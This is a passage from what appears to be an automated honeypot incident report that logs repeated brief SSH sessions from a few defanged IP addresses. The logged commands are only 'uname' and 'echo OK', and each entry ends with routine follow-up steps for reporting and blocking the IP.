| `2026-06-25 19:05:14` | `cowrie.command.input` |
| `2026-06-25 19:05:14` | `cowrie.log.closed` |
| `2026-06-25 19:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe93e7773ff5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:06 |
| **Last Seen** | 2026-06-25 19:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:06:06` | `cowrie.session.connect` |
| `2026-06-25 19:06:06` | `cowrie.client.version` |
| `2026-06-25 19:06:06` | `cowrie.client.kex` |
| `2026-06-25 19:06:06` | `cowrie.login.success` |
| `2026-06-25 19:06:07` | `cowrie.session.params` |
| `2026-06-25 19:06:07` | `cowrie.command.input` |
| `2026-06-25 19:06:07` | `cowrie.log.closed` |
| `2026-06-25 19:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eaa9cdab30b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 19:06 |
| **Last Seen** | 2026-06-25 19:06 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:06:45` | `cowrie.session.connect` |
| `2026-06-25 19:06:46` | `cowrie.client.version` |
| `2026-06-25 19:06:46` | `cowrie.client.kex` |
| `2026-06-25 19:06:52` | `cowrie.login.success` |
| `2026-06-25 19:06:55` | `cowrie.session.params` |
| `2026-06-25 19:06:55` | `cowrie.command.input` |
| `2026-06-25 19:06:56` | `cowrie.log.closed` |
| `2026-06-25 19:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fdb39c39b2a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:07 |
| **Last Seen** | 2026-06-25 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:07:01` | `cowrie.session.connect` |
| `2026-06-25 19:07:01` | `cowrie.client.version` |
| `2026-06-25 19:07:01` | `cowrie.client.kex` |
| `2026-06-25 19:07:01` | `cowrie.login.success` |
| `2026-06-25 19:07:02` | `cowrie.session.params` |
| `2026-06-25 19:07:02` | `cowrie.command.input` |
| `2026-06-25 19:07:02` | `cowrie.log.closed` |
| `2026-06-25 19:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c85fb2f7c3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:07 |
| **Last Seen** | 2026-06-25 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:07:56` | `cowrie.session.connect` |
| `2026-06-25 19:07:56` | `cowrie.client.version` |
| `2026-06-25 19:07:56` | `cowrie.client.kex` |
| `2026-06-25 19:07:56` | `cowrie.login.success` |
| `2026-06-25 19:07:57` | `cowrie.session.params` |
| `2026-06-25 19:07:57` | `cowrie.command.input` |
| `2026-06-25 19:07:57` | `cowrie.log.closed` |
| `2026-06-25 19:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82b367025f05

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:08 |
| **Last Seen** | 2026-06-25 19:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:08:52` | `cowrie.session.connect` |
| `2026-06-25 19:08:52` | `cowrie.client.version` |
| `2026-06-25 19:08:52` | `cowrie.client.kex` |
| `2026-06-25 19:08:52` | `cowrie.login.success` |
| `2026-06-25 19:08:53` | `cowrie.session.params` |
| `2026-06-25 19:08:53` | `cowrie.command.input` |
| `2026-06-25 19:08:53` | `cowrie.log.closed` |
| `2026-06-25 19:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c67a5306ca5b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:09 |
| **Last Seen** | 2026-06-25 19:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:09:46` | `cowrie.session.connect` |
| `2026-06-25 19:09:46` | `cowrie.client.version` |
| `2026-06-25 19:09:46` | `cowrie.client.kex` |
| `2026-06-25 19:09:47` | `cowrie.login.success` |
| `2026-06-25 19:09:47` | `cowrie.session.params` |
| `2026-06-25 19:09:47` | `cowrie.command.input` |
| `2026-06-25 19:09:47` | `cowrie.log.closed` |
| `2026-06-25 19:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd01bd6cec0f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:10 |
| **Last Seen** | 2026-06-25 19:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:10:46` | `cowrie.session.connect` |
| `2026-06-25 19:10:46` | `cowrie.client.version` |
| `2026-06-25 19:10:46` | `cowrie.client.kex` |
| `2026-06-25 19:10:46` | `cowrie.login.success` |
| `2026-06-25 19:10:47` | `cowrie.session.params` |
| `2026-06-25 19:10:47` | `cowrie.command.input` |
| `2026-06-25 19:10:47` | `cowrie.log.closed` |
| `2026-06-25 19:10:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12b9a162169d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:11 |
| **Last Seen** | 2026-06-25 19:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:11:47` | `cowrie.session.connect` |
| `2026-06-25 19:11:47` | `cowrie.client.version` |
| `2026-06-25 19:11:48` | `cowrie.client.kex` |
| `2026-06-25 19:11:48` | `cowrie.login.success` |
| `2026-06-25 19:11:49` | `cowrie.session.params` |
| `2026-06-25 19:11:49` | `cowrie.command.input` |
| `2026-06-25 19:11:49` | `cowrie.log.closed` |
| `2026-06-25 19:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-764ceab1e453

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:12 |
| **Last Seen** | 2026-06-25 19:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:12:47` | `cowrie.session.connect` |
| `2026-06-25 19:12:47` | `cowrie.client.version` |
| `2026-06-25 19:12:47` | `cowrie.client.kex` |
| `2026-06-25 19:12:48` | `cowrie.login.success` |
| `2026-06-25 19:12:48` | `cowrie.session.params` |
| `2026-06-25 19:12:48` | `cowrie.command.input` |
| `2026-06-25 19:12:48` | `cowrie.log.closed` |
| `2026-06-25 19:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d44938a787f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:13 |
| **Last Seen** | 2026-06-25 19:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:13:48` | `cowrie.session.connect` |
| `2026-06-25 19:13:48` | `cowrie.client.version` |
| `2026-06-25 19:13:48` | `cowrie.client.kex` |
| `2026-06-25 19:13:49` | `cowrie.login.success` |
| `2026-06-25 19:13:49` | `cowrie.session.params` |
| `2026-06-25 19:13:49` | `cowrie.command.input` |
| `2026-06-25 19:13:50` | `cowrie.log.closed` |
| `2026-06-25 19:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f38d0eee89

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:14 |
| **Last Seen** | 2026-06-25 19:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:14:45` | `cowrie.session.connect` |
| `2026-06-25 19:14:45` | `cowrie.client.version` |
| `2026-06-25 19:14:45` | `cowrie.client.kex` |
| `2026-06-25 19:14:46` | `cowrie.login.success` |
| `2026-06-25 19:14:46` | `cowrie.session.params` |
| `2026-06-25 19:14:46` | `cowrie.command.input` |
| `2026-06-25 19:14:47` | `cowrie.log.closed` |
| `2026-06-25 19:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fba30f9c1554

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:15 |
| **Last Seen** | 2026-06-25 19:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:15:47` | `cowrie.session.connect` |
| `2026-06-25 19:15:47` | `cowrie.client.version` |
| `2026-06-25 19:15:47` | `cowrie.client.kex` |
| `2026-06-25 19:15:47` | `cowrie.login.success` |
| `2026-06-25 19:15:48` | `cowrie.session.params` |
| `2026-06-25 19:15:48` | `cowrie.command.input` |
| `2026-06-25 19:15:48` | `cowrie.log.closed` |
| `2026-06-25 19:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-427078d1328a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:16 |
| **Last Seen** | 2026-06-25 19:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:16:42` | `cowrie.session.connect` |
| `2026-06-25 19:16:42` | `cowrie.client.version` |
| `2026-06-25 19:16:42` | `cowrie.client.kex` |
| `2026-06-25 19:16:42` | `cowrie.login.success` |
| `2026-06-25 19:16:43` | `cowrie.session.params` |
| `2026-06-25 19:16:43` | `cowrie.command.input` |
| `2026-06-25 19:16:43` | `cowrie.log.closed` |
| `2026-06-25 19:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c49f3e3ff83

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:17 |
| **Last Seen** | 2026-06-25 19:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:17:38` | `cowrie.session.connect` |
| `2026-06-25 19:17:38` | `cowrie.client.version` |
| `2026-06-25 19:17:38` | `cowrie.client.kex` |
| `2026-06-25 19:17:38` | `cowrie.login.success` |
| `2026-06-25 19:17:39` | `cowrie.session.params` |
| `2026-06-25 19:17:39` | `cowrie.command.input` |
| `2026-06-25 19:17:39` | `cowrie.log.closed` |
| `2026-06-25 19:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-049e24982a25

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 19:18 |
| **Last Seen** | 2026-06-25 19:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:18:06` | `cowrie.session.connect` |
| `2026-06-25 19:18:07` | `cowrie.client.version` |
| `2026-06-25 19:18:07` | `cowrie.client.kex` |
| `2026-06-25 19:18:13` | `cowrie.login.success` |
| `2026-06-25 19:18:16` | `cowrie.session.params` |
| `2026-06-25 19:18:16` | `cowrie.command.input` |
| `2026-06-25 19:18:18` | `cowrie.log.closed` |
| `2026-06-25 19:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0026b62831b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:18 |
| **Last Seen** | 2026-06-25 19:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:18:35` | `cowrie.session.connect` |
| `2026-06-25 19:18:35` | `cowrie.client.version` |
| `2026-06-25 19:18:35` | `cowrie.client.kex` |
| `2026-06-25 19:18:36` | `cowrie.login.success` |
| `2026-06-25 19:18:36` | `cowrie.session.params` |
| `2026-06-25 19:18:36` | `cowrie.command.input` |
| `2026-06-25 19:18:36` | `cowrie.log.closed` |
| `2026-06-25 19:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc41ff12f4f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:19 |
| **Last Seen** | 2026-06-25 19:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:19:33` | `cowrie.session.connect` |
| `2026-06-25 19:19:33` | `cowrie.client.version` |
| `2026-06-25 19:19:33` | `cowrie.client.kex` |
| `2026-06-25 19:19:34` | `cowrie.login.success` |
| `2026-06-25 19:19:34` | `cowrie.session.params` |
| `2026-06-25 19:19:34` | `cowrie.command.input` |
| `2026-06-25 19:19:34` | `cowrie.log.closed` |
| `2026-06-25 19:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5b4dc1d04eb

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 19:19 |
| **Last Seen** | 2026-06-25 19:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:19:41` | `cowrie.session.connect` |
| `2026-06-25 19:19:41` | `cowrie.client.version` |
| `2026-06-25 19:19:41` | `cowrie.client.kex` |
| `2026-06-25 19:19:43` | `cowrie.login.success` |
| `2026-06-25 19:19:44` | `cowrie.session.params` |
| `2026-06-25 19:19:44` | `cowrie.command.input` |
| `2026-06-25 19:19:45` | `cowrie.log.closed` |
| `2026-06-25 19:19:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f17a79858c8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:20 |
| **Last Seen** | 2026-06-25 19:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:20:31` | `cowrie.session.connect` |
| `2026-06-25 19:20:31` | `cowrie.client.version` |
| `2026-06-25 19:20:31` | `cowrie.client.kex` |
| `2026-06-25 19:20:31` | `cowrie.login.success` |
| `2026-06-25 19:20:32` | `cowrie.session.params` |
| `2026-06-25 19:20:32` | `cowrie.command.input` |
| `2026-06-25 19:20:32` | `cowrie.log.closed` |
| `2026-06-25 19:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c62bad91cc9b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:21 |
| **Last Seen** | 2026-06-25 19:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:21:27` | `cowrie.session.connect` |
| `2026-06-25 19:21:27` | `cowrie.client.version` |
| `2026-06-25 19:21:27` | `cowrie.client.kex` |
| `2026-06-25 19:21:27` | `cowrie.login.success` |
| `2026-06-25 19:21:28` | `cowrie.session.params` |
| `2026-06-25 19:21:28` | `cowrie.command.input` |
| `2026-06-25 19:21:28` | `cowrie.log.closed` |
| `2026-06-25 19:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20bd55437e60

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:22 |
| **Last Seen** | 2026-06-25 19:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:22:23` | `cowrie.session.connect` |
| `2026-06-25 19:22:23` | `cowrie.client.version` |
| `2026-06-25 19:22:23` | `cowrie.client.kex` |
| `2026-06-25 19:22:23` | `cowrie.login.success` |
| `2026-06-25 19:22:24` | `cowrie.session.params` |
| `2026-06-25 19:22:24` | `cowrie.command.input` |
| `2026-06-25 19:22:24` | `cowrie.log.closed` |
| `2026-06-25 19:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3618105f8b7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:23 |
| **Last Seen** | 2026-06-25 19:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:23:18` | `cowrie.session.connect` |
| `2026-06-25 19:23:18` | `cowrie.client.version` |
| `2026-06-25 19:23:18` | `cowrie.client.kex` |
| `2026-06-25 19:23:18` | `cowrie.login.success` |
| `2026-06-25 19:23:19` | `cowrie.session.params` |
| `2026-06-25 19:23:19` | `cowrie.command.input` |
| `2026-06-25 19:23:19` | `cowrie.log.closed` |
| `2026-06-25 19:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9545e88341aa

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:24 |
| **Last Seen** | 2026-06-25 19:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:24:14` | `cowrie.session.connect` |
| `2026-06-25 19:24:14` | `cowrie.client.version` |
| `2026-06-25 19:24:15` | `cowrie.client.kex` |
| `2026-06-25 19:24:15` | `cowrie.login.success` |
| `2026-06-25 19:24:16` | `cowrie.session.params` |
| `2026-06-25 19:24:16` | `cowrie.command.input` |
| `2026-06-25 19:24:16` | `cowrie.log.closed` |
| `2026-06-25 19:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80235c5e02c0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:25 |
| **Last Seen** | 2026-06-25 19:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:25:12` | `cowrie.session.connect` |
| `2026-06-25 19:25:12` | `cowrie.client.version` |
| `2026-06-25 19:25:12` | `cowrie.client.kex` |
| `2026-06-25 19:25:12` | `cowrie.login.success` |
| `2026-06-25 19:25:13` | `cowrie.session.params` |
| `2026-06-25 19:25:13` | `cowrie.command.input` |
| `2026-06-25 19:25:13` | `cowrie.log.closed` |
| `2026-06-25 19:25:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a260a4ac1312

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:26 |
| **Last Seen** | 2026-06-25 19:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 19:26:09` | `cowrie.session.connect` |
| `2026-06-25 19:26:09` | `cowrie.client.version` |
| `2026-06-25 19:26:10` | `cowrie.client.kex` |
| `2026-06-25 19:26:10` | `cowrie.login.success` |
| `2026-06-25 19:26:11` | `cowrie.session.params` |
| `2026-06-25 19:26:11` | `cowrie.command.input` |
| `2026-06-25 19:26:11` | `cowrie.log.closed` |
| `2026-06-25 19:26:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e91383aa7f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 19:27 |
| **Last Seen** | 2026-06-25 19:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

